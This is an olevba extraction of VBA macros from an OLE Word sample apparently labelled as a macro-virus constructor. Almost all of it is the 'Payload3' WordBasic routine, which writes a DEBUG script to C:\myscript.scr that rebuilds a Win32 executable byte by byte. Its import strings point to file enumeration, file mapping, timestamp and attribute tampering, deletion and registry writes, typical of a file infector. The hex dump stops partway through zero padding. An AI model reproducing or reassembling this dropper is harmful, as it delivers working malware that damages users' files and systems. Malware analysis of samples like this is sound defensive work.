olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Constructor.MSWord.Ctvck.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Constructor.MSWord.Ctvck.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Payload3.bas 
in file: Constructor.MSWord.Ctvck.c - OLE stream: 'Macros/VBA/Payload3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 03 00 7e 26 3a aa 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 16 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0220 00 04 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 30 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 50 00 00 00 04 00 00 00 00 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 40 00 00 a8 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 20 00 00 00 10 00 00 00 16 00 00 00 06 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 72 65 6c 6f 63 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 50 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 e9 29 08 00 00 2a 2e 58 45 58 00 47 65 74 50 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 6f 63 41 64 64 72 65 73 73 00 45 78 69 74 50 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 6f 63 65 73 73 00 46 69 6e 64 46 69 72 73 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 69 6c 65 41 00 46 69 6e 64 4e 65 78 74 46 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 65 41 00 47 65 74 43 75 72 72 65 6e 74 44 69 72 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 65 63 74 6f 72 79 41 00 43 72 65 61 74 65 46 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 6c 65 4d 61 70 70 69 6e 67 41 00 4d 61 70 56 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 65 77 4f 66 46 69 6c 65 00 55 6e 6d 61 70 56 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 65 77 4f 66 46 69 6c 65 00 47 65 74 46 69 6c 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 41 74 74 72 69 62 75 74 65 73 41 00 53 65 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 69 6c 65 41 74 74 72 69 62 75 74 65 73 41 00 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 65 74 44 72 69 76 65 54 79 70 65 41 00 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 61 74 65 46 69 6c 65 41 00 43 6c 6f 73 65 48 61 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 6e 64 6c 65 00 47 65 74 46 69 6c 65 54 69 6d 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 00 53 65 74 46 69 6c 65 54 69 6d 65 00 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 46 69 6c 65 50 6f 69 6e 74 65 72 00 47 65 74 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 69 6c 65 53 69 7a 65 00 53 65 74 45 6e 64 4f 66 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 46 69 6c 65 00 47 65 74 53 79 73 74 65 6d 54 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 6d 65 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 6c 65 41 00 47 65 74 57 69 6e 64 6f 77 73 44 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 72 65 63 74 6f 72 79 41 00 47 65 74 53 79 73 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 65 6d 44 69 72 65 63 74 6f 72 79 41 00 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 41 00 44 65 6c 65 74 65 46 69 6c 65 41 00 47 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 6f 62 61 6c 41 6c 6c 6f 63 00 57 72 69 74 65 46 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 69 6c 65 00 ff 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 41 44 56 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 41 50 49 33 32 2e 64 6c 6c 00 52 65 67 43 72 65 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 61 74 65 4b 65 79 45 78 41 00 52 65 67 53 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 56 61 6c 75 65 45 78 41 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 00 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 47 65 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 00 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
